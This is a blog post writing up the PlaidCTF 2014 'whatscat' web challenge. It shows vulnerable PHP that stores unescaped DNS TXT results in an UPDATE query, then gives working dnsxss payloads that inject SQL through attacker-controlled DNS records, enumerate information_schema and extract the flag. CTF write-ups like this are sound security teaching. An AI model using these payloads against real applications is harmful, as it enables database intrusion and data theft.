---
id: 1856
title: 'PlaidCTF writeup for Web-300 &#8211; whatscat (SQL Injection via DNS)'
date: '2014-04-16T12:29:31-05:00'
author: ron
layout: post
guid: 'https://blog.skullsecurity.org/?p=1856'
permalink: /2014/plaidctf-writeup-for-web-300-whatscat-sql-injection-via-dns
categories:
    - DNS
    - Hacking
    - 'PlaidCTF 2014'
    - Tools
---

Hey folks,

This is my writeup for Whatscat, just about the easiest 300-point Web level I've ever solved! I wouldn't normally do a writeup about a level like this, but much like <a href='/2014/plaidctf-web-150-mtpox-hash-extension-attack'>the mtpox</a> level I actually wrote the exact tool for exploiting this, and even wrote a <a href='/2010/stuffing-javascript-into-dns-names'>blog post about it</a> almost exactly 4 years ago - April of 2010. Unlike mtpox, this tool isn't the least bit popular, but it sure made my life easy!
<!--more-->
<h2>The set up</h2>

Whatscat is a php application where people can post photos of cats and comment on them (<a href='https://blogdata.skullsecurity.org/whatscat.tar.bz2'>Here's a copy of the source</a>).

The vulnerable code is in the password-reset code, in login.php, which looks like this:

<pre>
  <span class="Statement">elseif</span> <span class="Special">(</span><span class="Statement">isset</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>&quot;<span class="Constant">reset</span>&quot;<span class="Special">]))</span> <span class="Special">{</span>
    <span class="Statement">$</span><span class="Identifier">q</span> <span class="Statement">=</span> <span class="Identifier">mysql_query</span><span class="Special">(</span><span class="Identifier">sprintf</span><span class="Special">(</span>&quot;<span class="Constant">select username,email,id from users where username='%s'</span>&quot;,
      <span class="Identifier">mysql_real_escape_string</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_POST</span><span class="Special">[</span>&quot;<span class="Constant">name</span>&quot;<span class="Special">])))</span>;
    <span class="Statement">$</span><span class="Identifier">res</span> <span class="Statement">=</span> <span class="Identifier">mysql_fetch_object</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">q</span><span class="Special">)</span>;
    <span class="Statement">$</span><span class="Identifier">pwnew</span> <span class="Statement">=</span> &quot;<span class="Constant">cat</span>&quot;<span class="Statement">.</span><span class="Identifier">bin2hex</span><span class="Special">(</span>openssl_random_pseudo_bytes<span class="Special">(</span><span class="Constant">8</span><span class="Special">))</span>;
    <span class="Statement">if</span> <span class="Special">(</span><span class="Statement">$</span><span class="Identifier">res</span><span class="Special">)</span> <span class="Special">{</span>
      <span class="PreProc">echo</span> <span class="Identifier">sprintf</span><span class="Special">(</span>&quot;<span class="Constant">&lt;p&gt;Don't worry %s, we're emailing you a new password at %s&lt;/p&gt;</span>&quot;,
        <span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-&gt;</span>username,<span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-&gt;</span>email<span class="Special">)</span>;
      <span class="PreProc">echo</span> <span class="Identifier">sprintf</span><span class="Special">(</span>&quot;<span class="Constant">&lt;p&gt;If you are not %s, we'll tell them something fishy is going on!&lt;/p&gt;</span>&quot;,
        <span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-&gt;</span>username<span class="Special">)</span>;
<span class="Statement">$</span><span class="Identifier">message</span> <span class="Statement">=</span> <span class="Statement">&lt;&lt;&lt;</span><span class="Special">CAT</span>
Hello. Either you or someone pretending to be you attempted to reset your password.
Anyway, we set your new password to <span class="Statement">$</span><span class="Identifier">pwnew</span>

If it wasn't you who changed your password, we have logged their IP information as follows:
<span class="Special">CAT</span>;
      <span class="Statement">$</span><span class="Identifier">details</span> <span class="Statement">=</span> <span class="Identifier">gethostbyaddr</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_SERVER</span><span class="Special">[</span>'<span class="Constant">REMOTE_ADDR</span>'<span class="Special">])</span><span class="Statement">.</span>
        <span class="Identifier">print_r</span><span class="Special">(</span><span class="Identifier">dns_get_record</span><span class="Special">(</span><span class="Identifier">gethostbyaddr</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_SERVER</span><span class="Special">[</span>'<span class="Constant">REMOTE_ADDR</span>'<span class="Special">]))</span>,<span class="Constant">true</span><span class="Special">)</span>;
      <span class="Identifier">mail</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-&gt;</span>email,&quot;<span class="Constant">whatscat password reset</span>&quot;,<span class="Statement">$</span><span class="Identifier">message</span><span class="Statement">.</span><span class="Statement">$</span><span class="Identifier">details</span>,&quot;<span class="Constant">From: whatscat@whatscat.cat</span><span class="Special">\r\n</span>&quot;<span class="Special">)</span>;
      <span class="Identifier">mysql_query</span><span class="Special">(</span><span class="Identifier">sprintf</span><span class="Special">(</span>&quot;<span class="Constant">update users set password='%s', resetinfo='%s' where username='%s'</span>&quot;,
              <span class="Statement">$</span><span class="Identifier">pwnew</span>,<span class="Statement">$</span><span class="Identifier">details</span>,<span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-&gt;</span>username<span class="Special">))</span>;
    <span class="Special">}</span>
    <span class="Statement">else</span> <span class="Special">{</span>
      <span class="PreProc">echo</span> &quot;<span class="Constant">Hmm we don't seem to have anyone signed up by that name</span>&quot;;
    <span class="Special">}</span>
</pre>

Specifically, these lines:

<pre>
      <span class="Statement">$</span><span class="Identifier">details</span> <span class="Statement">=</span> <span class="Identifier">gethostbyaddr</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_SERVER</span><span class="Special">[</span>'<span class="Constant">REMOTE_ADDR</span>'<span class="Special">])</span><span class="Statement">.</span>
        <span class="Identifier">print_r</span><span class="Special">(</span><span class="Identifier">dns_get_record</span><span class="Special">(</span><span class="Identifier">gethostbyaddr</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">_SERVER</span><span class="Special">[</span>'<span class="Constant">REMOTE_ADDR</span>'<span class="Special">]))</span>,<span class="Constant">true</span><span class="Special">)</span>;
      <span class="Identifier">mail</span><span class="Special">(</span><span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-&gt;</span>email,&quot;<span class="Constant">whatscat password reset</span>&quot;,<span class="Statement">$</span><span class="Identifier">message</span><span class="Statement">.</span><span class="Statement">$</span><span class="Identifier">details</span>,&quot;<span class="Constant">From: whatscat@whatscat.cat</span><span class="Special">\r\n</span>&quot;<span class="Special">)</span>;
      <span class="Identifier">mysql_query</span><span class="Special">(</span><span class="Identifier">sprintf</span><span class="Special">(</span>&quot;<span class="Constant">update users set password='%s', resetinfo='%s' where username='%s'</span>&quot;,
              <span class="Statement">$</span><span class="Identifier">pwnew</span>,<span class="Statement">$</span><span class="Identifier">details</span>,<span class="Statement">$</span><span class="Identifier">res</span><span class="Type">-&gt;</span>username<span class="Special">))</span>;
</pre>

The $details variable is being inserted into the database unescaped. I've noted in the past that people trust DNS results just a bit too much, and this is a great example of that mistake! If we can inject SQL code into a DNS request, we're set!

...this is where I wasted a lot of time, because I didn't notice that the print_r() is actually part of the same statement as the line before it - I thought only the reverse DNS entry was being put into the database. As such, my friend <a href='https://twitter.com/mak_kolybabi'>Mak</a>&mdash;who was working on this level first&mdash;tried to find a way to change the PTR record, and broke all kinds of <a href='http://www.skullspace.ca'>SkullSpace</a> infrastructure as a result.

I ended up trying to log in as 'admin'/'password', and, of course, failed. On a hunch, I hit 'forgot password' for admin. That sent me to a <a href='http://mailinator.com/'>Mailinator</a>-like service. I logged into the mailbox, and noticed somebody trying to sql inject using TXT records. This wasn't an actual admin&mdash;like I thought it was&mdash;it was another player who just gave me a huge hint (hooray for disposable mail services!). Good fortune!

Knowing that a TXT record would work, it actually came in handy that Mak controls the PTR records for all SkullSpace ip addresses. He could do something useful instead of breaking stuff! The server I use for blogs (/me waves) and such is on the SkullSpace network, so I got him to set the PTR record to test.skullseclabs.org. In fact, if you do a reverse lookup for '206.220.196.59' right now, you'll still see that:

<pre>
$ host blog.skullsecurity.org
blog.skullsecurity.org is an alias for skullsecurity.org.
skullsecurity.org has address 206.220.196.59
$ host 206.220.196.59
59.196.220.206.in-addr.arpa domain name pointer test.skullseclabs.org.
</pre>

I control the authoritative server for test.skullseclabs.org&mdash;that's why it exists&mdash;so I can make it say anything I want for any record. It's great fun! Though arguably overkill for this level, at least I didn't have to flip to my registrar's page every time I wanted to change a record; instead, I can do it quickly using a tool I wrote called <a href='https://github.com/iagox86/nbtool'>dnsxss</a>. Here's an example:

<pre>
$ sudo ./dnsxss <span class="Special">--payload=</span><span class="Statement">&quot;</span><span class="Constant">Hello yes this is test</span><span class="Statement">&quot;</span>
Listening <span class="Statement">for </span>requests on 0.0.0.0:<span class="Constant">53</span>
Will response to queries with: Hello/yes/this/is/<span class="Statement">test</span>

$ dig <span class="Statement">-t</span> txt test123.skullseclabs.org
<span class="Statement">[</span>...<span class="Statement">]</span>
<span class="Statement">;;</span> ANSWER SECTION:
test123.skullseclabs.org. <span class="Constant">1</span>     IN      TXT     <span class="Statement">&quot;</span><span class="Constant">Hello yes this is test.test123.skullseclabs.org</span><span class="Statement">&quot;</span>
</pre>

All I had to do was find the right payload!

<h2>The exploit</h2>

I'm not a fan of working blind, so I made my own version of this service locally, and turned on SQL errors. Then I got to work constructing an exploit! It was an UPDATE statement, so I couldn't directly exploit this - I could only read indirectly by altering my email address (as you'll see). I also couldn't figure out how to properly terminate the sql string (neither '#' nor '-- ' nor ';' properly terminated due to brackets). In the end, my payload would:

<ul>
  <li>Tack on an extra clause to the UPDATE that would set the 'email' field to another value</li>
  <li>Read properly right to the end, which means ending the query with "resetinfo='", so the "resetinfo" field gets set to all the remaining crap</li>
</ul>

So, let's give this a shot!

<pre>./dnsxss --payload="test', email='test1234', resetinfo='"</pre>

Then I create an account, reset the password from my ip address, and refresh. The full query&mdash;dumped from my test server&mdash;looks like:

<pre><span class="Statement">update</span> users <span class="Statement">set</span> password=<span class="Constant">'catf7a252e008616c94'</span>, resetinfo=<span class="Constant">'test.skullseclabs.orgArray ( [0] =&gt; Array ( [host] =&gt; test.skullseclabs.org [class] =&gt; IN [ttl] =&gt; 1 [type] =&gt; TXT [txt] =&gt; test'</span>, email=<span class="Constant">'test1234'</span>, resetinfo=<span class="Constant">'.test.skullseclabs.org [entries] =&gt; Array ( [0] =&gt; test'</span>, email=<span class="Constant">'test1234'</span>, resetinfo=<span class="Constant">' ) ) ) '</span> <span class="Special">where</span> username=<span class="Constant">'ron'</span></pre>


As you can see, that's quite a mess (note that the injected stuff appears twice.. super annoying). After that runs, the reset-password page looks like:

<pre>
Don't worry ron, we're emailing you a new password at <strong>test1234</strong>

If you are not ron, we'll tell them something fishy is going on!
</pre>

Sweet! I successfully changed my password!

But... what am I looking for?

MySQL has this super handy database called information_schema, which contains tables called 'SCHEMATA', 'TABLES', and 'COLUMNS', and it's usually available for anybody to inspect. Let's dump SCHEMATA.SCHEMA_NAME from everything:

<pre>./dnsxss --payload="test', email=(select group_concat(SCHEMA_NAME separator ', ') from information_schema.SCHEMATA), resetinfo='"</pre>

Then refresh a couple times to find:

<pre>
Don't worry ron, we're emailing you a new password at <strong>information_schema, mysql, performance_schema, whatscat</strong>

If you are not ron, we'll tell them something fishy is going on!
</pre>

Great! Three of those are built-in databases, but 'whatscat' looks interesting. Now let's get table names from whatscat:

<pre>./dnsxss --payload="test', email=(select group_concat(TABLE_NAME separator ', ') from information_schema.TABLES where TABLE_SCHEMA='whatscat'), resetinfo='"</pre>

Leads to:

<pre>
Don't worry ron, we're emailing you a new password at <strong>comments, flag, pictures, users</strong>

If you are not ron, we'll tell them something fishy is going on!
</pre>

flag! Sweet! That's a pretty awesome looking table! Now we're one simple step away... what columns does 'flag' contain?

<pre>./dnsxss --payload="test', email=(select group_concat(COLUMN_NAME separator ', ') from information_schema.COLUMNS where TABLE_NAME='flag'), resetinfo='"</pre>

Leads to:

<pre>
Don't worry ron, we're emailing you a new password at <strong>flag</strong>

If you are not ron, we'll tell them something fishy is going on!
</pre>

All right, we know the flag is in whatscat.flag.flag, so we write one final query:

<pre>./dnsxss --payload="test', email=(select group_concat(flag separator ', ') from whatscat.flag), resetinfo='"</pre>

Which gives us:

<pre>
Don't worry ron, we're emailing you a new password at <strong>20billion_d0llar_1d3a</strong>

If you are not ron, we'll tell them something fishy is going on!
</pre>

And now we dance.

<h2>Conclusion</h2>

If you're interested in DNS attacks&mdash;this scenario and a whole bunch of others&mdash;come see my talk at <a href='http://www.bsidesquebec.org/'>BSidesQuebec</a> this June!!!